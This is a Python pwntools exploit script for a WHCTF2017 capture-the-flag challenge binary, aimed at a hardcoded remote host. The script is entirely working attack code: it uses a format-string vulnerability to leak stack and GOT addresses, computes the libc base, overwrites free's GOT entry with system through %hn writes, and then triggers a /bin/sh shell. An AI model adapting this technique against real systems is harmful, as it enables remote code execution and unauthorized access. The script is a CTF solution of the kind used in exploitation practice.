import time, sys
from pwn import *

# local process envirnoment
LOCAL = True
elf_name = "./pwn1"

#retmote args
remote_host = "118.31.18.29"
remote_port = 20003
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    # context.log_level = "debug"
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "./lib.so.6:/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    mine_env['LD_PRELOAD'] = "./lib.so.6"
    io = process(elf_name, env=mine_env)
    libc = ELF("./libc.so.6")
else:
    io = remote(remote_host, remote_port)
    libc = ELF("./libc.so.6")

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.01)

def mmenu(opt):
    io.recvuntil("Code:")
    io.sendline(str(opt))

def mod_1(mcontent):
    mmenu(1)
    io.recvuntil("Welcome To WHCTF2017:")
    dlySend(mcontent)

def tell_name(mcontent):
    mmenu(2)
    io.recvuntil("Input Your Name:\n")
    dlySend(mcontent)

def s_exp():
    tell_name('a'*0x100)

    payload = 'A'*0x3E8
    # "START_%389$x_END"
    payload += "START_%389$ld_END"    #5 2D029E5CF9 9EB066CCF9
    mod_1(payload)
    io.recvuntil("Your Input Is :")
    io.recvuntil("%389$ld_ENDART_")
    data = io.recvuntil("_ENDART")[:-7]
    m_lkaddr = int(data)
    atoi_gotoff = 0x201377
    atoi_got = m_lkaddr + atoi_gotoff
    free_got = atoi_got - 0x58

    log.info("atoi got addr:"+hex(atoi_got))

    payload = 'A'*0x3E8
    #payload += "ND_%262$x_ENDNDN"   #5 54A8 9EB066CCF9
    payload += "ND_%133$s_ENDNDN"
    payload += p64(atoi_got)
    mod_1(payload)
    io.recvuntil("Your Input Is :")
    io.recvuntil("NDNp")
    io.recvuntil("_")
    data = io.recvuntil("_E")[:-2]
    atoi_addr = u64(data.ljust(8, chr(0)))
    log.info("atoi addr:"+hex(atoi_addr))
    libc.address = atoi_addr - libc.symbols["atoi"]
    log.info("libc address:"+hex(libc.address))
    log.info("system address:"+hex(libc.symbols["system"]))
    log.info("free address:"+hex(libc.symbols["free"]))
    pause()

    # exp
    payload = 'A'*0x3E8
    part1_le = libc.symbols["system"] & 0xFFFF
    part1_le = part1_le-0x3E8-0x15
    #payload += "%" + str(part1_le) + "$5d%133$hn"
    payload += "N_%" + str(part1_le) + "d%133$hn"
    payload = payload.ljust(0x3f8, chr(0))
    payload += p64(free_got)
    mod_1(payload)

    payload = 'A'*0x3E8
    part1_le = (libc.symbols["system"]>>8) & 0xFFFF
    part1_le = part1_le-0x3E8-0x15
    #payload += "%" + str(part1_le) + "$5d%133$hn"
    payload += "N_%" + str(part1_le) + "d%133$hn"
    payload = payload.ljust(0x3f8, chr(0))
    payload += p64(free_got+1)
    mod_1(payload)

    tell_name("/bin/sh\x00")
    io.interactive()


if __name__ == "__main__":
    s_exp()
    pause()
